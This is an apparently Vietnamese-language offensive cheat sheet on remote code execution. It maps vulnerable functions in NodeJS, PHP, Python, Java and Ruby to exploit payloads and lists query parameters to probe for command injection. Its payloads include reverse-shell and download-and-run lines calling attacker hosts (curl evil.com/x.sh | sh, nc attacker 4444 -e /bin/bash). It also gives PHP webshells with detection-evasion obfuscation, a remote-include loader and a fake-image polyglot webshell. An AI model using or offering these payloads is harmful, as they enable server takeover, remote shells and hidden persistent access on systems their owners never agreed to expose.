
---

## 🔍 Bảng tóm tắt "ngôn ngữ → hàm RCE → payload minh hoạ"

| 🧠 Ngôn ngữ | ☠️ Hàm dễ bị RCE                             | 🔥 Ví dụ payload khai thác                       |        |
| ----------- | -------------------------------------------- | ------------------------------------------------ | ------ |
| **NodeJS**  | `child_process.exec()`                       | \`127.0.0.1; curl evil.com/x.sh                  | sh\`   |
|             | `eval()` / `Function()`                      | `");require('child_process').exec('id');//`      |        |
|             | `res.render()` (SSTI)                        | `<%= require('child_process').execSync("id") %>` |        |
| **PHP**     | `eval()`, `system()`, `exec()`, `passthru()` | `php?cmd=ls` với `system($_GET["cmd"]);`         |        |
|             | `preg_replace('/e')` (cũ)                    | `/\/e/i` kết hợp với `"${phpinfo()}"`            |        |
| **Python**  | `os.system()`, `subprocess.Popen()`          | `127.0.0.1 && nc attacker 4444 -e /bin/bash`     |        |
|             | `eval()` / `exec()`                          | `__import__('os').system('id')`                  |        |
|             | `pickle.loads()`                             | Payload pickle inject: RCE qua serialized object |        |
| **Java**    | `Runtime.getRuntime().exec()`                | `"ping -c 1 attacker.com"`                       |        |
|             | Deserialization RCE (commons-collections)    | Gadget chain `.readObject()` => reverse shell    |        |
| **Ruby**    | `eval()`, `system()`, backticks \`\`\`       | `\`curl attacker.com/x.sh                        | sh\`\` |
|             | `send()`                                     | `"send(:eval, 'system(\"id\")')"`                |        |

---
Parameters where you can try Command Injection.
```
?cmd={;id}
?exec={;id}
?command={;id}
?execute{;id}
?ping={;id}
?query={;id}
?jump={;id}
?code={;id}
?reg={;id}
?do={;id}
?func={;id}
?arg={;id}
?option={;id}
?load={;id}
?process={;id}
?step={;id}
?read={;id}
?function={;id}
?req={;id}
?feature={;id}
?exe={;id}
?module={;id}
?;id={;id}
?run={;id}
?print={;id}
```
---
## 🚨 Gợi ý khai thác theo ngữ cảnh:

* **Nếu URL có `/ping`, `/convert`, `/run`, `/template` →** test payload command injection.
* **Nếu có truyền dữ liệu user → render ra giao diện (template engine)** → test SSTI.
* **Nếu thấy JSON chứa `"data": "code here"` →** test eval hoặc exec.
* **Nếu có upload file `.pkl`, `.ser`, `.php`, `.rb` →** thử inject object RCE.

---
># ```<?php system(\$_GET['cmd']); ?>```

---

### 🔥 **Top payload PHP RCE thay thế `system($_GET['cmd'])`:**

#### 1. **Các biến thể cùng chức năng:**

```php
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_REQUEST['cmd']); ?>
<?php eval("?>".file_get_contents("php://input")); ?>
<?php assert($_POST['cmd']); ?>
<?php exec($_GET['cmd']); ?>
<?=$_GET['cmd']?> // short-tag, nếu short_open_tag enabled
```

---

### 🕵️‍♂️ **Evasion / Obfuscation (né detection):**

#### 2. **Obfuscate nhẹ bằng biến và hàm:**

```php
<?php $f = 'system'; $f($_GET['cmd']); ?>
<?php ${'sys'.'tem'}($_REQUEST['cmd']); ?>
<?php $a="cmd"; system($_GET[$a]); ?>
```

---

#### 3. **Base64 decode rồi eval:**

```php
<?php eval(base64_decode("c3lzdGVtKCRfR0VUWydjbWQnXSk7")); ?>
// Decode ra: system($_GET['cmd']);
```

---

#### 4. **Tải mã độc từ xa (webshell nhẹ):**

```php
<?php @include($_GET['load']); ?>
// gọi: ?load=http://evil.com/shell.txt
```

---

#### 5. **Dùng input/output stream:**

```php
<?php echo `$_GET[0]`; ?>
<?php echo file_get_contents('php://input'); ?>
```

---

#### 6. **Polyglot + Fake Extension:**

* Đặt payload vào `.jpg`, `.gif`, `.txt`, nhưng thêm payload ở đuôi hoặc EXIF.
* File `.jpg` nhưng nội dung là:

```php
GIF89a<?php system($_GET['cmd']); ?>
```

---

### 🧠 **Tips thực chiến:**

* Nếu PHP-FPM xử lý tất cả `.jpg`, `.txt` (CVE-2019-11043 kiểu), thì đuôi không quan trọng.
* Khi bị filter `system`, `exec`, `passthru` → dùng eval + base64 hoặc hàm gián tiếp (`call_user_func`, `create_function`).
* Nếu bị filter cả `eval` → thử **assert** vì `assert('code');` = eval trong PHP.

---

### 📌 **Payload gợi ý bu xài nếu target khó chịu:**

```php
<?php $a=base64_decode("c3lzdGVt"); $a($_REQUEST['c']); ?>
// gọi: ?c=id
```
